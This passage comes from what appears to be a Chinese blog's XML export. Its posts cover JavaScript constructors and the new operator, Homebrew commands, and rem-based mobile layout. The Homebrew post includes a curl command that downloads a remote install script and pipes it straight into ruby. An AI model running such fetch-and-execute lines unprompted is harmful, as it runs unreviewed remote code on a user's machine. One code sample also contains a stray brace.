Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 局部添加方法和属性会立即生效，重写整个原型对象会切断现有实例和原型的关系</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在已经创建实例的情况下，使用Person.prototype=&#123;&#125;这种对象字面量，相当于重写原型</span></span><br><span class="line">    <span class="comment">// 会切断现有实例和原型之间的关联</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<br><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a><br><a href="https://www.zhihu.com/question/34183746" target="_blank" rel="noopener">https://www.zhihu.com/question/34183746</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS中的面向对象2-new操作符做了什么</title>
      <link href="/2018/06/22/jsoo_new/"/>
      <url>/2018/06/22/jsoo_new/</url>
      
        <content type="html"><![CDATA[<p>本系列是学习整理js中的面向对象的第2篇，new操作符做了什么<br><a id="more"></a></p><p>new运算符的作用是创建一个类的实例（类可以是我们自定义的对象类型Person，也可以是具有构造函数的内置对象（如Object，Array，Function））</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o1 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br></pre></td></tr></table></figure><p>实际经历4个步骤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">// 实际经历了如下四步：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.创建空对象</span></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置原型链，指向类【构造函数】的原型</span></span><br><span class="line">instance.__proto__ = Person.prototype;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.让构造函数Person的this指向实例instance,执行构造函数Person的函数体</span></span><br><span class="line"><span class="keyword">var</span> p = Person.call(instance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.判断Person的返回值类型</span></span><br><span class="line"><span class="comment">// 值类型就不要了，还是返回instance</span></span><br><span class="line"><span class="comment">// 如果是引用类型，替换掉instance返回引用类型</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> p == <span class="string">'object'</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> p</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如果把随便一个函数当作构造函数，用new来调用"><a href="#如果把随便一个函数当作构造函数，用new来调用" class="headerlink" title="如果把随便一个函数当作构造函数，用new来调用"></a>如果把随便一个函数当作构造函数，用new来调用</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回值类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name);</span><br><span class="line">  <span class="comment">// return name; 加不加这个都返回空的say类型的obj:&#123;&#125;,没有return 相当于return undefined，值类型，丢弃。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> say(<span class="string">'Eva'</span>); <span class="comment">// 同上返回say类型的obj:&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">instance <span class="keyword">instanceof</span> say; <span class="comment">// true</span></span><br><span class="line">instance.__proto__ === say.prototype; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreatePerson</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> p = &#123; <span class="attr">age</span>: age, <span class="attr">name</span>: name &#125;;</span><br><span class="line">  <span class="keyword">return</span> p; <span class="comment">// 返回引用类型，原有的实例被丢弃，因为原有的instance被丢弃</span></span><br><span class="line">  <span class="comment">// 此处的实例和CreatPerson并无原型链的关系，只是普通的Object对象</span></span><br><span class="line">  <span class="comment">// 所以可以理解上文中的寄生模式和稳妥模式都不再有原型链关系的原因啦。简言之，new无效则原型无效</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> CreatePerson(<span class="number">11</span>, <span class="string">'Eva'</span>); <span class="comment">// &#123;age: 11, name: "Eva"&#125; 但是注意此处不是CreatePerson类的对象了，就是普通的Object对象</span></span><br><span class="line"></span><br><span class="line">p.__proto__ == CreatePerson.prototype <span class="comment">// false;</span></span><br></pre></td></tr></table></figure><h4 id="new的实现"><a href="#new的实现" class="headerlink" title="new的实现"></a>new的实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">New</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*1*/</span></span><br><span class="line">  <span class="keyword">var</span> instance = &#123; <span class="string">'__proto__'</span>: fn.prototype &#125;; <span class="comment">// 每个对象天生自带__proto__属性，此处只是重新指定了</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/*2*/</span></span><br><span class="line">    <span class="keyword">var</span> res = fn.apply(instance, <span class="built_in">arguments</span>);</span><br><span class="line">    <span class="comment">/*3*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> res == <span class="string">'object'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line">New(Person)(<span class="number">11</span>, <span class="string">'Eva'</span>);</span><br></pre></td></tr></table></figure><h4 id="无new调用"><a href="#无new调用" class="headerlink" title="无new调用"></a>无new调用</h4><p>构造函数也是函数，可以直接调用，为了避免忘记通过new来调用构造函数，导致属性和方法添加在window对象上，污染全局变量，一般会在构造函数中检查当前作用域，这样即使不通过new来生成实例也可以得到正确的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span> <span class="keyword">instanceof</span> Person) &#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Person(age, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解了new的实际作用，就不难理解原型对象的实现了</p><p>参考文献：</p><p><a href="https://www.zhihu.com/question/36440948" target="_blank" rel="noopener">https://www.zhihu.com/question/36440948</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS中的面向对象1-面向对象写法的进化</title>
      <link href="/2018/06/18/jsoo_develop/"/>
      <url>/2018/06/18/jsoo_develop/</url>
      
        <content type="html"><![CDATA[<p>JS红宝书中关于JS面向对象写法讲的很详细也很理解，把整个发展过程简化整理了一下，方便复习。<br>本系列是js中的面向对象的第一篇，面向对象写法的进化。<br><a id="more"></a></p><p>1.最原始的创建对象方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">person.name = <span class="string">'Eva'</span>;</span><br><span class="line">person.age = <span class="number">12</span>;</span><br><span class="line">person.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.使用对象字面量来创建对象<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Eva'</span>,</span><br><span class="line">  age: <span class="number">12</span>,</span><br><span class="line">  sayName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3.工厂方法来创建对象<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">  o.name = name;</span><br><span class="line">  o.age = age;</span><br><span class="line">  o.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>缺点是：无法知道对象的类型</p><p>4.构造函数模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = age; <span class="comment">// 为实例添加属性和方法</span></span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 本质是如下:每个方法在每个实例上都需要重新创建一遍</span></span><br><span class="line"><span class="keyword">this</span>.sayName = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'console.log(this.name)'</span>);</span><br><span class="line"><span class="comment">// this指向：如果是无new调用，this就会指向window || global</span></span><br><span class="line"><span class="comment">// new 调用：new做了什么参见下篇</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Person(<span class="number">11</span>, <span class="string">'Eve'</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Person(<span class="number">12</span>, <span class="string">'Tom'</span>);</span><br><span class="line">p1.constructor === p2.constructor === Person;</span><br><span class="line">p1 <span class="keyword">instanceof</span> Person; <span class="comment">// true</span></span><br><span class="line">p2 <span class="keyword">instanceof</span> Person; <span class="comment">// true</span></span><br><span class="line">p1.sayName == p2.sayName <span class="comment">// false 每个方法在每个实例上都需要重新创建一遍</span></span><br></pre></td></tr></table></figure></p><p>相比第三种：可以将实例标志成某种特定的类型<br>缺点是：每个方法在每个实例上都需要重新创建一遍,直接写成全局函数又会污染全局变量，无封装性可言</p><p>5.原型模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;&#125;;</span><br><span class="line">Person.prototype.name = <span class="string">'Eva'</span>;</span><br><span class="line">Person.prototype.age = <span class="number">8</span>;</span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Person(<span class="number">11</span>, <span class="string">'Eve'</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Person(<span class="number">12</span>, <span class="string">'Tom'</span>);</span><br><span class="line">p1.constructor === p2.constructor === Person;</span><br><span class="line">p1 <span class="keyword">instanceof</span> Person; <span class="comment">// true</span></span><br><span class="line">p2 <span class="keyword">instanceof</span> Person; <span class="comment">// true</span></span><br><span class="line">p1.sayName === p2.sayName <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以简写为以下</span></span><br><span class="line"><span class="comment">// 缺点：constructor会指向Object构造函数</span></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: Person, // 在这里手动指定来解决</span><br><span class="line">  name: 'Eva',</span><br><span class="line">  age: 18,</span><br><span class="line">  sayName: function() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>6.构造函数和原型模式组合使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.toys = [&apos;toy1&apos;, &apos;toy2&apos;];</span><br><span class="line">p1.toys.push(&apos;toy3&apos;);</span><br><span class="line">p2.toys.length === 3 // true</span><br><span class="line"></span><br><span class="line">// 改为以下：解决引用类型属性的共享问题,*是最常用的写法*</span><br><span class="line">function Person(age, name, toys) &#123;</span><br><span class="line">  this.age = age; // 为实例添加属性和方法</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.toys = toys;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  constructor: Person,</span><br><span class="line">  sayName: function() &#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>7.动态原型模式<br>其他语言开发者一般都会将原型和构造函数写在一起，所以出现了下面的模式，将所有信息都封装在构造函数中,更完美<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.sayName !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要注意的是不能再使用对象字面量重写Person.prototype，因为在已经创建了实例之后再重写原型，就会切断实例与新原型的关系</p><p>8.寄生构造函数模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SpecialArray</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> vals = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  vals.push.apply(vals,<span class="built_in">arguments</span>);</span><br><span class="line">  vals.toPipedString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.join(<span class="string">'|'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> vals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建的新对象是基于Array的，所以叫寄生模式。<br>因为创造出的对象并还是Array类而不是SpecialArray类，所以没办法使用instanceof来判断类型，一般不建议使用这种方式</p><p>9.稳妥构造函数模式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">  o.name = name;</span><br><span class="line">  o.age = age;</span><br><span class="line">  o.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = Person(<span class="number">11</span>, <span class="string">'Eva'</span>);</span><br></pre></td></tr></table></figure></p><p>与上面前7种的区别在于：1.不引用this，2.不通过new来创建<br>和第8种有相同的问题：创建对象与构造函数没什么关系，也不能使用instanceof<br>但是保证了局部变量的安全性，除了sayName函数，外部无法访问name属性</p><p>通过面向对象写法的进化过程可以发现，第7种方式是最常用最完美的方式，后面几种也在某些特定场景有特定的应用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 工具 」 homebrew的使用</title>
      <link href="/2017/11/18/homebrew/"/>
      <url>/2017/11/18/homebrew/</url>
      
        <content type="html"><![CDATA[<p>Home-brew是mac上的软件安装管理工具，有了它每次安装软件都不用去google了，直接<code>brew install</code>就可以啦。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装home-brew</span><br><span class="line">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><p>拥有安装、卸载、更新、查看、搜索等很多实用的功能。简单的一条指令，就可以实现包管理，而不用你关心各种依赖和文件路径的情况，十分方便快捷。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 版本</span><br><span class="line">brew -v</span><br><span class="line"></span><br><span class="line"># 更新 Homebrew版本</span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"># 帮助</span><br><span class="line">brew -h</span><br><span class="line"></span><br><span class="line"># 检查问题</span><br><span class="line">brew doctor</span><br><span class="line"></span><br><span class="line"># 查看所有包</span><br><span class="line">brew list</span><br><span class="line"></span><br><span class="line"># 查看你的包是否需要更新</span><br><span class="line">brew outdated</span><br><span class="line"></span><br><span class="line"># 更新包</span><br><span class="line">brew upgrade &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"># 安装包</span><br><span class="line">brew install &lt;package_name&gt;</span><br></pre></td></tr></table></figure><p>Homebrew 将会把老版本的包缓存下来，以便当你想回滚至旧版本时使用。但这是比较少使用的情况，当你想清理旧版本的包缓存时，可以运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cleanup</span><br></pre></td></tr></table></figure><p>常用包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install openssl mongodb</span><br><span class="line">brew rm docker</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>移动端UI自适应最佳实践</title>
      <link href="/2017/08/18/mobile_ui_flex/"/>
      <url>/2017/08/18/mobile_ui_flex/</url>
      
        <content type="html"><![CDATA[<p>我们的工作少不了要和UI设计师打交道，一般设计小姐姐给的图都是iPhone6尺寸750*1334px，这样我们在切图时，只需要将像素值/2作为元素的宽高，字体的尺寸即可。但是一般的设计图中border是1px，怎么把元素的border设置为0.5px呢？</p><p>有的小伙伴说，那是他们不专业，随便写个1px就可以了。但是我们rgb不变直接写成1px的话，会明显发现border显得太粗颜色太深。</p><p>作为一个有追求的前端工程师，应该怎么做到border的高保真呢？浏览器支持0.5px吗？<br><a id="more"></a></p><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><p>我们先忽略这个0.5px的问题，思考下移动端适配的历史。</p><p>最开始我们适配时都是通过百分比来解决的。但是百分比只能解决宽度自适应，高度却不能自适应，小尺寸屏幕上按钮过高，显得臃肿</p><p>对于不同屏幕上宽高比一致的方案，使用百分比达不到效果</p><p>其他的解决方案<br>px：px相对于屏幕分辨率而言（与物理设备有关），普通屏是1px对应1个物理像素点，高清屏是1px对应4个物理像素点<br>em：相对长度单位，相对于当前对象内的字体尺寸，em的值不固定，继承父级字体大小<br>rem：相对于html根元素的尺寸。只修改根元素html就可以成比例的调整所有字体大小。</p><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><p>rem兼容性：</p><p>iOS6.1+都支持<br>Android 2.1+都支持<br>主流浏览器都支持</p><h3 id="em和rem"><a href="#em和rem" class="headerlink" title="em和rem"></a>em和rem</h3><p>em：相对于当前元素内的字体尺寸。当前元素font-size=20px，当前元素中的1em=20px</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1&#123;font-size:20px;&#125; // 1em=20px</span><br></pre></td></tr></table></figure><p>rem简单，1rem始终是那么大，但rem使组件不那么模块化。实际开发中可以结合使用:</p><p>1.当元素属性值需要根据元素字体尺寸缩放时，就使用em</p><p>2.其他情况都简单的使用rem</p><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>rem：font-size of the root element</p><p>rem：期望字体/body-font-size rem</p><p>rem不仅适用于字体，也可以用于width height margin</p><p>使用scss可以直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html&#123;font-size:10px;&#125;1rem=10px;</span><br><span class="line">html&#123;font-size:62.5%;&#125; // =10px</span><br><span class="line"></span><br><span class="line">@mixin px2rem($px)&#123;</span><br><span class="line">$rem:37.5px;// window.innerWidth/10</span><br><span class="line">@return ($px/$rem)+rem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">height:px2rem(90px);</span><br></pre></td></tr></table></figure><p>使用media query来设置根节点，上面的设置方法有一个很明显的问题font-size是在一个屏幕宽度的区间上有一个基准值。像安卓手机种类的繁多，屏幕大小就更多的情况下，上面的方法很鸡肋。</p><p>第二种解决方案，就是使用JavaScript根据当前屏幕的宽度动态计算font-size值，这种方法可以保证屏幕宽度连续变化的时候，font-size基准值也是连续变化的。</p><p>那么最后一个问题也来了：为什么将计算rem单位的js放在head标签里面？</p><p>一句话总结：在浏览器中文档流是从上往下加载渲染的。为了保证发生不必要的重绘或者是重排肯定是越早给根节点设置font-size值越好。</p><h3 id="rem适用场景"><a href="#rem适用场景" class="headerlink" title="rem适用场景"></a>rem适用场景</h3><p>整体的布局还是使用百分比<br>使用rem的最佳场景是,遇到例如多列带有图片的列表,常常需要图片固定宽高比例<br>研究了一些网站，比如淘宝，对字体字体一般情况建议使用px<br>出现1px像素线的地方，仍旧使用border-width:1px;而不是border-width:.1rem;</p><h3 id="5px的解决"><a href="#5px的解决" class="headerlink" title=".5px的解决"></a>.5px的解决</h3><p>设计稿中常常是iPhone6尺寸750*1334px,border是1px</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动端设置viewport</span></span><br><span class="line"><span class="comment">// 直接按照750*1334来切图</span></span><br><span class="line"><span class="comment">// 解决.5px border</span></span><br><span class="line"><span class="keyword">var</span> dpr = <span class="built_in">window</span>.devicePixelRatio,</span><br><span class="line">viewPort = <span class="built_in">document</span>.createElement(<span class="string">'meta'</span>),</span><br><span class="line">head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span 